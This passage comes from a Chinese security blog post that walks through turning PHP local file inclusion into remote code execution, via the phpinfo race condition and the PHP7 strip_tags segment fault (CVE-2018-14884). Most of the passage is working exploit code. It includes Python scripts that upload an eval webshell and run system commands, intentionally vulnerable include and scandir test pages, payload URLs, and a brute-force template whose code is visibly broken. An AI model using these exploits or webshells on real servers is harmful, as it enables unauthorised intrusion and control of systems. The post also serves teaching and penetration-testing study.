+        <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"0\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    i <span class="token operator">=</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
+        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No php tmp_name in phpinfo output"</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span> <span class="token string">"found %s at %i"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>
+    <span class="token comment" spellcheck="true"># padded up a bit</span>
+    <span class="token keyword">return</span> i <span class="token operator">+</span> <span class="token number">256</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span> <span class="token string">"LFI With PHPInfo()"</span>
+    <span class="token keyword">print</span> <span class="token string">"-="</span> <span class="token operator">*</span> <span class="token number">30</span>
+
+    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"Usage: %s host [port] [threads]"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"Error with hostname %s: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    port <span class="token operator">=</span> <span class="token number">80</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        port <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"Error with port %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    poolsz <span class="token operator">=</span> <span class="token number">10</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        poolsz <span class="token operator">=</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"Error with poolsz %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span> <span class="token string">"Getting initial offset..."</span><span class="token punctuation">,</span>
+    reqphp<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> reqlfi <span class="token operator">=</span> setup<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
+    offset <span class="token operator">=</span> getOffset<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">)</span>
+    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    maxattempts <span class="token operator">=</span> <span class="token number">1000</span>
+    e <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    l <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span> <span class="token string">"Spawning worker pool (%d)..."</span> <span class="token operator">%</span> poolsz
+    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    tp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> poolsz<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        tp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ThreadWorker<span class="token punctuation">(</span>e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> maxattempts<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> reqlfi<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>
+        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token keyword">while</span> <span class="token operator">not</span> e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">break</span>
+            <span class="token keyword">with</span> l<span class="token punctuation">:</span>
+                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"\r% 4d / % 4d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>counter<span class="token punctuation">,</span> maxattempts<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token keyword">if</span> counter <span class="token operator">>=</span> maxattempts<span class="token punctuation">:</span>
+                    <span class="token keyword">break</span>
+        <span class="token keyword">print</span>
+        <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span> <span class="token string">"Woot!  \m/"</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span> <span class="token string">":("</span>
+    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"\nTelling threads to shutdown..."</span>
+        e<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">print</span> <span class="token string">"Shuttin' down..."</span>
+    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>
+        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li><strong>运行脚本Getshell</strong></li>
+</ul>
+<p>修改脚本之后，运行即可包含生成我们精心设置好的/tmp/Qftm后门文件</p>
+<p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/1594459-20200315225216329-559250938.png" alt></p>
+<p>拿到RCE之后，可以查看tmp下生成的后门文件</p>
+<pre><code>http://192.33.6.145/index.php?file=/tmp/Qftm&amp;Qftm=system(%27ls%20/tmp/%27)</code></pre><p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/1594459-20200315230443683-2055517116.png" alt></p>
+<p>然后使用后门管理工具连接后门webshell</p>
+<pre><code>/tmp/Qftm &lt;?php eval($_REQUEST[Qftm])?&gt;</code></pre><p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/1594459-20200315225312757-1103748104.png" alt></p>
+<h1 id="php7-Segment-Fault"><a href="#php7-Segment-Fault" class="headerlink" title="php7 Segment Fault"></a>php7 Segment Fault</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
+<li><strong>利用条件</strong></li>
+</ul>
+<pre><code>7.0.0 &lt;= PHP Version &lt; 7.0.28</code></pre><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在上面包含姿势中提到的包含临时文件，需要知道phpinfo同时还需条件竞争，但如果没有phpinfo的存在，我们就很难利用上述方法去getshell。</p>
+<p>那么如果目标不存在phpinfo，应该如何处理呢？这里可以用<code>php7 segment fault</code>特性（<a href="https://bugs.php.net/bug.php?id=75535" target="_blank" rel="noopener">CVE-2018-14884</a>）进行Bypass。</p>
+<p>php代码中使用php://filter的过滤器<code>strip_tags</code> , 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不想phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方在PHP Version 7.0.28时已经修复该漏洞</p>
+<p><img src="https://p2.ssl.qhimg.com/t01c23acd8e061b02a4.png" alt></p>
+<p>官方php7更新日志信息</p>
+<pre><code>https://www.php.net/ChangeLog-7.php</code></pre><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>依据漏洞分析构造可利用的payload：</p>
+<pre><code>http://192.33.6.145/index.php?file=php://filter/string.strip_tags/resource=/etc/passwd</code></pre><p>这种包含会导致php执行过程中出现segment fault，此时上传文件，临时文件会被保存在<code>upload_tmp_dir</code>所指定的目录下，不会被删除，这样就能达成getshell的目的。</p>
+<h2 id="代码环境"><a href="#代码环境" class="headerlink" title="代码环境"></a>代码环境</h2><h3 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h3><p>index.php</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">include</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>dir.php</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><pre><code>PHP Version 7.0.9</code></pre><p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/1594459-20200316004623276-188976420.png" alt></p>
+<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="攻击载荷"><a href="#攻击载荷" class="headerlink" title="攻击载荷"></a>攻击载荷</h3><p>string.strip_tags过滤器导致出现php segment fault</p>
+<pre><code>index.php?file=php://filter/string.strip_tags/resource=index.php</code></pre><p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/1594459-20200316003857964-1584067442.png" alt></p>
+<p>可以看到上面这种包含会导致php执行过程中出现错误，此时上传文件，临时文件会被保存在<code>upload_tmp_dir</code>所指定的目录下，从而不会被删除，一直存储在服务的临时目录里面。</p>
+<h3 id="攻击利用-技巧1"><a href="#攻击利用-技巧1" class="headerlink" title="攻击利用-技巧1"></a>攻击利用-技巧1</h3><p>我们可以通过<code>dir.php</code>辅助查找生成的临时文件</p>
+<h4 id="编写-Linux-Exp"><a href="#编写-Linux-Exp" class="headerlink" title="编写 Linux Exp"></a>编写 Linux Exp</h4><p>Linux网络攻击环境下的脚本编写</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#python version 2.7</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
+<span class="token keyword">import</span> re
+
+files <span class="token operator">=</span> <span class="token punctuation">{</span>
+  <span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span><span class="token string">'&lt;?php eval($_REQUEST[Qftm]);'</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+url1 <span class="token operator">=</span> <span class="token string">'http://192.168.68.119/index.php?file=php://filter/string.strip_tags/resource=index.php'</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+
+url2 <span class="token operator">=</span> <span class="token string">'http://192.168.68.119/dir.php?dir=/tmp/'</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span>
+data <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"php[a-zA-Z0-9]{1,}"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span>
+<span class="token keyword">print</span> data
+<span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span>
+
+url3<span class="token operator">=</span><span class="token string">'http://192.168.68.119/index.php?file=/tmp/'</span><span class="token operator">+</span>data
+data <span class="token operator">=</span> <span class="token punctuation">{</span>
+<span class="token string">'Qftm'</span><span class="token punctuation">:</span><span class="token string">"system('whoami');"</span>
+<span class="token punctuation">}</span>
+r <span class="token operator">=</span>  requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url3<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="编写-Windows-Exp"><a href="#编写-Windows-Exp" class="headerlink" title="编写 Windows Exp"></a>编写 Windows Exp</h4><p>windows网络攻击环境下的脚本编写</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#python version 2.7</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
+<span class="token keyword">import</span> re
+
+files <span class="token operator">=</span> <span class="token punctuation">{</span>
+  <span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span><span class="token string">'&lt;?php eval($_REQUEST[Qftm]);'</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+url1 <span class="token operator">=</span> <span class="token string">'http://192.168.68.119/web/fi/index.php?file=php://filter/string.strip_tags/resource=index.php'</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+
+url2 <span class="token operator">=</span> <span class="token string">'http://192.168.68.119/web/fi/dir.php?dir=C:/Windows/'</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span>
+data <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"php[a-zA-Z0-9]{1,}"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span>
+<span class="token keyword">print</span> data
+<span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span>
+
+url3<span class="token operator">=</span><span class="token string">'http://192.168.68.119/web/fi/index.php?file=C:/Windows/'</span><span class="token operator">+</span>data<span class="token operator">+</span><span class="token string">'.tmp'</span>
+data <span class="token operator">=</span> <span class="token punctuation">{</span>
+<span class="token string">'Qftm'</span><span class="token punctuation">:</span><span class="token string">"system('whoami');"</span>
+<span class="token punctuation">}</span>
+r <span class="token operator">=</span>  requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url3<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+<span class="token keyword">print</span> r<span class="token punctuation">.</span>content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="系统EXP利用"><a href="#系统EXP利用" class="headerlink" title="系统EXP利用"></a>系统EXP利用</h4><p>针对不同的系统环境运行脚本就可以RCE拿到任意代码执行</p>
+<p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/1594459-20200316015524441-1930184916.png" alt></p>
+<p>然后查看服务器上恶意临时文件，确实存在未被删除！！</p>
+<pre><code>http://192.168.68.119/web/fi/dir.php?file=C:/Windows/</code></pre><p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/1594459-20200316020638294-1112172603.png" alt></p>
+<h4 id="Getshell-1"><a href="#Getshell-1" class="headerlink" title="Getshell"></a>Getshell</h4><p>由于我们上传的恶意临时文件没有被删除，那么就可以使用Webshell管理工具蚁剑对<code>php2EFF.tmp</code>进行包含利用。</p>
+<pre><code>C:/Windows/php2EF.tmp  &lt;?php eval($_REQUEST[Qftm])?&gt;
+</code></pre><p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/image-20200317184818635.png" alt="image-20200317184818635"></p>
+<h3 id="攻击利用-技巧2"><a href="#攻击利用-技巧2" class="headerlink" title="攻击利用-技巧2"></a>攻击利用-技巧2</h3><h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><p>假如没有<code>dir.php</code>还能利用吗，答案是可以的，因为我们传入的恶意文件没有被删除，这样我们就可以爆破这个文件的文件名。</p>
+<p>在上面的讲述中，我们知道不同的系统默认的临时文件存储路径和方式都不一样</p>
+<ul>
+<li>Linux</li>
+</ul>
+<p>Linux临时文件主要存储在<code>/tmp/</code>目录下，格式通常是（<code>/tmp/php[6个随机字符]</code>）</p>
+<ul>
+<li>windows</li>
+</ul>
+<p>Windows临时文件主要存储在<code>C:/Windows/</code>目录下，格式通常是（<code>C:/Windows/php[4个随机字符].tmp</code>）</p>
+<p>对比Linux和Windows来看，Windows需要破解的位数比Linux少，从而Windows会比Linux破解速度快，位数越长所需要耗费的时间就越大。</p>
+<h4 id="攻击载荷-1"><a href="#攻击载荷-1" class="headerlink" title="攻击载荷"></a>攻击载荷</h4><p>编写临时文件生成和暴力破解攻击载荷</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#python version 2.7</span>
+
+<span class="token keyword">import</span> requests
+<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO
+
+files <span class="token operator">=</span> <span class="token punctuation">{</span>
+  <span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span><span class="token string">'&lt;?php eval($_REQUEST[Qftm]);'</span><span class="token punctuation">)</span>
+<span class="token punctuation">}</span>
+url1 <span class="token operator">=</span> <span class="token string">'http://192.168.68.119/web/fi/index.php?file=php://filter/string.strip_tags/resource=index.php'</span>
+r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">########################暴力破解模块########################</span>
+url2<span class="token operator">=</span><span class="token string">'http://192.168.68.119/web/fi/index.php?file=C:/Windows/php'</span><span class="token operator">+</span><span class="token punctuation">{</span>fuzz<span class="token punctuation">}</span><span class="token operator">+</span><span class="token string">'.tmp&amp;Qftm=system('</span>whoami<span class="token string">');'</span>
+data <span class="token operator">=</span> fuzz
+<span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span>
+<span class="token keyword">print</span> data
+<span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span>
+<span class="token comment" spellcheck="true">########################暴力破解模块########################</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>对于暴力破解模块，可以自己添加多线程模块进行暴力破解，也可以将暴力破解模块拿出来单独进行fuzz，或者比较常用的做法就是将一些fuzz工具的模块拿出来添加到里面稍微改一下接口就可以直接使用。</p>
+<p>推荐使用fuzz工具直接进行fuzz测试，fuzz工具一般都包含多线程、自定义字典等，使用起来很方便，不用花费时间去编写调试代码。</p>
+<p>个人比较喜欢使用Fuzz大法，不管是目录扫描、后台扫描、Web漏洞模糊测试都是非常灵活的。</p>
+<p>推荐几款好用的Fuzz工具</p>
+<pre><code>基于Go开发：gobuster     https://github.com/OJ/gobuster
+基于Java开发：dirbuster  OWASP杰出工具 kali自带
+基于Python开发：wfuzz    https://github.com/xmendez/wfuzz</code></pre><p>fuzz测试，配置参数，我这里使用的是Kali自带的 <code>dirbuster</code>进行模糊测试</p>
+<p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/1594459-20200316025145178-1635744948.png" alt></p>
+<p>参数设置好之后，开始进行fuzz测试</p>
+<p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/1594459-20200316025758906-1722829701.png" alt></p>
+<p>经过一段时间的破解，即可得到上传的临时文件的文件名，同时可以在响应包中看到后门文件的恶意代码也正常解析执行。</p>
+<h4 id="Getshell-2"><a href="#Getshell-2" class="headerlink" title="Getshell"></a>Getshell</h4><p>拿到我们上传的恶意临时文件的文件名之后就可以进行包含利用，同样，我们上传的恶意临时文件没有被删除，使用Webshell管理工具对<code>php2EFF.tmp</code>后门文件进行包含利用。</p>
+<p><img src="/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/image-20200317184818635.png" alt="image-20200317184818635"></p>
+<h2 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h2><pre><code>https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf
+
+https://www.php.net/ChangeLog-7.php</code></pre><pre><code>文章首发于安全客：https://www.anquanke.com/post/id/201136</code></pre>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Qftm</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://Qftm.github.io/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/">http://Qftm.github.io/2020/03/15/LFI-PHPINFO-OR-PHP7-Segment-Fault/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">Qftm</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/PHP/">
+                                    <span class="chip bg-color">PHP</span>
+                                </a>
+                            
+                                <a href="/tags/LFI/">
+                                    <span class="chip bg-color">LFI</span>
+                                </a>
+                            
+                                <a href="/tags/Bypass/">
+                                    <span class="chip bg-color">Bypass</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
